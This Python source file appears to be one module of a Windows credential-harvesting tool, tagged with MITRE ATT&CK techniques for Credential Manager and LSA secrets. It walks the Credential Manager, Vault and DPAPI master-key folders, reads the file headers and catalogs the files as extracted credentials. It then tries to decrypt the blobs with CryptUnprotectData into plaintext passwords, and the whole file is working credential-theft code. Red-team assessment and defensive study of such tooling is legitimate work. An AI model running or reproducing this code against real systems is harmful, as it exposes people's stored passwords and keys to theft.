"""
DPAPIGrabber — Enumerate DPAPI-protected credential stores

Targets:
- DPAPI master key files (for offline cracking)
- Windows Credential Manager credential files
- Windows Vault files

This module discovers and catalogs DPAPI-protected stores. Actual
decryption of individual blobs is handled by _crypto.dpapi_decrypt()
in modules that need it (browser.py, etc.).

Requires: Admin privileges for full coverage
MITRE ATT&CK: T1555.004 (Windows Credential Manager), T1003.004 (LSA Secrets)
"""

from __future__ import annotations

import os

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel


class DPAPIGrabber(GrabberModule):
    name = "dpapi"
    description = "Enumerate DPAPI master keys and Windows Credential Manager files"
    min_privilege = PrivilegeLevel.USER  # Can discover files, admin needed for some decryption
    supported_platforms = ("Windows",)
    default_enabled = True

    _DPAPI_PATHS = [
        ("{appdata}/Microsoft/Credentials", "Credential Manager"),
        ("{localappdata}/Microsoft/Credentials", "Credential Manager (Local)"),
        ("{appdata}/Microsoft/Protect", "DPAPI Master Keys"),
        ("{localappdata}/Microsoft/Vault", "Windows Vault"),
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        for template, _ in self._DPAPI_PATHS:
            path = template.format(
                appdata=context.appdata_roaming or "",
                localappdata=context.appdata_local or "",
            )
            if path and os.path.isdir(path):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        for template, store_name in self._DPAPI_PATHS:
            path = template.format(
                appdata=context.appdata_roaming or "",
                localappdata=context.appdata_local or "",
            )
            if not path or not os.path.isdir(path):
                continue

            files = self._enumerate_credential_files(path)
            for file_info in files:
                result.credentials.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="key",
                    target_application=store_name,
                    url=file_info["path"],
                    encrypted_value=file_info.get("header", b""),
                    notes=f"size={file_info['size']} bytes",
                    mitre_technique="T1555.004",
                ))

            if files:
                result.findings.append(self.make_finding(
                    file_path=path,
                    description=f"Found {len(files)} {store_name} file(s)",
                    score=50 * min(len(files), 3),
                    matched_value=store_name,
                    snippets=[f["name"] for f in files[:5]],
                ))

        # Try to decrypt credential blobs using CryptUnprotectData
        if context.is_windows:
            self._decrypt_credential_files(result)

        result.status = GrabberStatus.COMPLETED
        return result

    def _decrypt_credential_files(self, result: GrabberResult) -> None:
        """Attempt to decrypt DPAPI credential blobs using CryptUnprotectData."""
        try:
            from ._crypto import dpapi_decrypt
        except ImportError:
            return

        for cred in list(result.credentials):
            if not cred.encrypted_value or len(cred.encrypted_value) < 20:
                continue
            # DPAPI blobs start with specific header
            if cred.encrypted_value[:4] != b"\x01\x00\x00\x00":
                continue

            try:
                decrypted = dpapi_decrypt(cred.encrypted_value)
                if decrypted:
                    # Try to decode as UTF-16LE (Windows credential format)
                    try:
                        plaintext = decrypted.decode("utf-16-le", errors="ignore").rstrip("\x00")
                    except Exception:
                        plaintext = decrypted.decode("utf-8", errors="ignore")

                    if plaintext and len(plaintext) >= 2:
                        cred.decrypted_value = plaintext
                        cred.credential_type = "password"
                        self.logger.debug(f"Decrypted DPAPI blob: {cred.url}")

                        result.findings.append(self.make_finding(
                            file_path=cred.url or "[DPAPI]",
                            description=f"DPAPI credential decrypted",
                            score=200,
                            matched_value="CryptUnprotectData success",
                        ))
            except Exception as e:
                self.logger.debug(f"DPAPI decrypt failed: {e}")

    @staticmethod
    def _enumerate_credential_files(directory: str) -> list[dict]:
        """Enumerate DPAPI credential files with metadata."""
        files = []
        try:
            for root, dirs, filenames in os.walk(directory):
                for fname in filenames:
                    fpath = os.path.join(root, fname)
                    try:
                        stat = os.stat(fpath)
                        # Read first 64 bytes as header for identification
                        header = b""
                        try:
                            with open(fpath, "rb") as f:
                                header = f.read(64)
                        except OSError:
                            pass

                        files.append({
                            "path": fpath,
                            "name": fname,
                            "size": stat.st_size,
                            "header": header,
                        })
                    except OSError:
                        continue
        except (PermissionError, OSError):
            pass
        return files
